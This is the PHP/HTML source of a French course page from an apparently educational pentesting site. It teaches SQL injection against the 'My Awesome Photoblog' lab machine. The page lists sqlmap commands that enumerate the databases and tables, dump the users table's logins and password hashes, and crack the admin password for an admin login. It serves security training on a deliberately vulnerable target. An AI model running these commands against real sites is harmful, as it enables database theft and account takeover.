<?php
require('../db/connexionDB.php');           // Fichier PHP contenant la connexion à la BDD
session_start();                            // On démarre la session
if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur connecté, redirection vers la page de connexion
{ 
    ?>
    <script language="Javascript">
        document.location.replace("../login.php");
    </script>
    <?php
}
?>

<!DOCTYPE html>
<html lang="fr">
    <?php // En-tête de la page ?>
    <head>
        <?php // Balises meta responsive ?>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale-1">

        <?php // Bootstrap CSS ?>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
        
        <?php // jQuery et Bootstrap JS ?>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
        
        <?php // Feuille de style ?>
        <link rel="stylesheet" href="../style.css">

        <?php // Titre principal et icône de la page ?>
        <title>Faille SQL</title>
        <link rel="icon" type="image/png" sizes="16x16" href="../images/deathstarw.png">
    </head>

    <?php // Corps de la page ?>
    <body style="background-color: rgba(61,72,92)">
        <?php 
        // Inclusion de la barre de navigation
        require_once('menuCourses.php'); 

        // Mise en place d'un fil d'Arianne
        ?>
        <div class="centrer" style="box-shadow: 0 5px 5px rgba(0, 0, 0, .2);">  
            <div class="breadcrumb">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="../index.php">Accueil</a></li>
                        <li class="breadcrumb-item"><a href="../courses.php">Cours</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Exploitez une vulnérabilité web : Faille SQL</li>
                    </ol>
                </nav>
            </div> 
            <h1>Exploitez une vulnérabilité web : Faille SQL</h1>
            </br>
            </br>
        </div>
        </br>
        </br>
        <?php // Cours ?>
        <div class="container-fluid">
            <?php // Insertion de la vidéo Youtube du tutoriel ?>
            <div class="row justify-content-center">
                <div class="group col-sm-0">
                    <iframe width="560" height="315" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);" src="https://www.youtube.com/embed/fzh-B3Xogwc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                </div> 
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; text-align: justify; color: white">
                        </br>
                        Dans ce cours nous allons apprendre à faire des injections SQL avec Kali et l’outil SQLMAP sur la machine web victime « My Awesome Photoblog ». 
                        </br>
                        </br>
                        SQLMAP est un outil open source permettant d'identifier et d'exploiter une injection SQL sur des applications web. Outre la simple exploitation d'une injection SQL, 
                        il fournit également des fonctionnalités permettant la prise de contrôle de l'équipement hébergeant la base de données. Il est devenu aujourd'hui indispensable dans la trousse à outils de tout pentester. 
                        </br>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0">      
                    <img src="../images/sqlmap1.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; text-align: justify; color: white">
                        </br>
                        </br>
                        Après un scan nmap comme vu lors du précédent tutoriel, on cherche l’adresse IP de notre machine cible, 192.168.1.50 dans notre cas. 
                        </br>
                        On lance l’outil SQLMAP avec le lien du site : 
                        </br>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                        <kbd> sqlmap </kbd>
                        </br>
                        <kbd> sqlmap -u http://192.168.1.50/cat.php?id=1 --dbs  </kbd>
                        </br>
                        <kbd> y </kbd>
                        </br>
                        <kbd> y </kbd>
                        </br>
                        </samp>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        On retrouve deux noms dans la base de données : 
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/sqlmap2.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        On recupère maintenant les tables contenues dans photoblog : 
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                        <kbd> sqlmap -u http://192.168.1.50/cat.php?id=1 -D photoblog --tables </kbd>
                        </br>
                        </samp>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/sqlmap3.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        On récupère ensuite les données dans la table users :
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                        <kbd> sqlmap -u http://192.168.1.50/cat.php?id=1 -D photoblog -T users –columns </kbd>
                        </br>
                        </samp>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/sqlmap4.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                        <kbd> sqlmap -u http://192.168.1.50/cat.php?id=1 -D photoblog -T users -C id,password,login --dump </kbd>
                        </br>
                        </samp>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/sqlmap5.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        On peut ensuite récupérer le mot de passe contenu dans la base de données et utiliser une attaque par dictionnaire incluse dans l’outil SQLMAP : 
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/sqlmap6.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        Nous avons donc trouvé le login « <samp>admin</samp> » et le mot de passe « <samp>P4ssw0rd</samp> » et nous pouvons donc nous connecter en tant qu’admin sur le site.  
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/sqlmap7.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                        </br>
                    </p>
                </div>
            </div>
        </div>
    </body>
    <?php 
    // Inclusion de la barre de navigation
    require_once('footerCourses.php'); 
    ?>
</html>